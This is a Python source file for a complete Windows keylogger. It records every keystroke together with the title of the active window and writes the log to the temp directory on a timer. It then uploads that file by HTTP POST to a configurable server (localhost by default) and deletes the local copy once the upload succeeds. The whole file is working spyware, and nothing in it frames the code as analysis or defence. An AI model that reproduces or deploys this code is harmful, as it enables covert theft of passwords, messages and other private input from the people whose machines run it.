from pynput.keyboard import Listener
import tempfile
import threading
import os
import win32gui
from datetime import datetime
import requests


# This class defines a Keylogger
class Keylogger:
    # The constructor initializes the Keylogger's attributes with default values
    # for the log timer, report timer, size threshold, and server URL
    def __init__(self, logTimer=60, reportTimer=3600, sizeThreshold=10000, serverURL="http://127.0.0.1:5000/log"):
        self.string = ''  # the string to log key presses to
        self.window = ''  # the name of the current window
        self.logTimer = logTimer  # the interval at which to log key presses to a file
        # the interval at which to report log data to the server
        self.reportTimer = reportTimer
        # the size threshold at which to report log data to the server
        self.sizeThreshold = sizeThreshold
        self.log_timer = None  # a timer object for logging key presses to a file
        self.report_timer = None  # a timer object for reporting log data to the server
        self.serverURL = serverURL  # the URL of the server to report log data to
        # Change the working directory to the system's temporary directory
        os.chdir(tempfile.gettempdir())
        # Cancel the log_timer and report_timer if they are not None
        if self.log_timer is not None:
            self.log_timer.cancel()
        if self.report_timer is not None:
            self.report_timer.cancel()

    # This method returns the name of the window that currently has focus
    def get_window_name(self):
        w = win32gui
        return w.GetWindowText(w.GetForegroundWindow())
    # This method logs a key press and adds the appropriate character to the string attribute

    def onpress(self, key):
       # Create a timestamp for the current time
        timestamp = datetime.timestamp(datetime.now())
        # If the name of the current window is different from the previously recorded window,
        # update the name of the current window and add a new entry to the log string with the
        # window name and timestamp
        if self.window != self.get_window_name():
            self.window = self.get_window_name()
            self.string += "\n[ " + self.window + \
                " (" + datetime.fromtimestamp(timestamp).strftime("%m/%d/%Y, %Hh%Mm%Ss") + ")]\n"

        # Define a dictionary of key mappings for special keys that don't have a character representation
        key_mappings = {
            96: "0",
            97: "1",
            98: "2",
            99: "3",
            100: "4",
            101: "5",
            102: "6",
            103: "7",
            104: "8",
            105: "9",
            106: "*",
            107: "+",
            109: "-",
            110: "."
        }

        try:
            # If the key has a 'vk' attribute, it is a special key with no character representation,
            # so we look up its mapped value in the key_mappings dictionary
            if hasattr(key, 'vk') and 96 <= key.vk <= 110:
                self.string += key_mappings.get(key.vk, key.char)
            else:
                # Otherwise, we add the character representation of the key to the log string
                self.string += key.char
        except AttributeError:
            # If the key doesn't have a character representation, we handle some special cases
            # manually, such as the space key and the enter key
            if str(key) == "Key.space":
                self.string += " "
            elif str(key) == "Key.enter":
                self.string += '\n'
            elif str(key) == "Key.shift":
                pass
            else:
                self.string += ' [' + str(key).strip('Key.') + '] '
        except:
            self.string += "??"

    def send_log(self, log_file):
        # Open the log file for reading
        with open(log_file, "r") as f:
            # Read the contents of the log file
            log_data = f.read()
        try:
            response = requests.post(self.serverURL, data=log_data)
            # Return True if the request was successful (i.e. the server returned a 200 status code),
            # otherwise return False
            return True if response.status_code == 200 else False
        except:
            # If an error occurred while sending the request, return False
            return False

    def log(self):
        # If the log_timer is not None, cancel it
        if self.log_timer is not None:
            self.log_timer.cancel()

        # Open the log file for appending
        with open("log.txt", "a") as f:
            # Attempt to write the current log string to the log file
            try:
                f.write(self.string)
            except:
                # If an error occurs while writing to the log file, do nothing
                pass

            # Clear the current log string
            self.string = ""

        # Create a new timer object with the specified logTimer interval
        self.log_timer = threading.Timer(self.logTimer, self.log)
        # Start the timer
        self.log_timer.start()

    def report(self):
        # If the report_timer is not None, cancel it
        if self.report_timer is not None:
            self.report_timer.cancel()

        # If the log file is larger than the specified size threshold,
        if os.stat('log.txt').st_size > self.sizeThreshold:
            # Attempt to send the log file to the server and remove it if the send was successful
            try:
                # Send the log file to the server
                success = self.send_log('log.txt')
                # If the send was successful, remove the log file
                if success:
                    os.remove('log.txt')
            except:
                # If an error occurred while sending the log file, do nothing
                pass

        # Create a new timer object with the specified reportTimer interval
        self.report_timer = threading.Timer(self.reportTimer, self.report)
        # Start the timer
        self.report_timer.start()

    def run(self):
        # Start the report timer
        self.report()
        # Start the log timer
        self.log()
        # Create a Listener object and specify the onpress callback function
        with Listener(on_press=self.onpress) as listener:
            # Start listening for key presses
            listener.join()


logger = Keylogger()
logger.run()
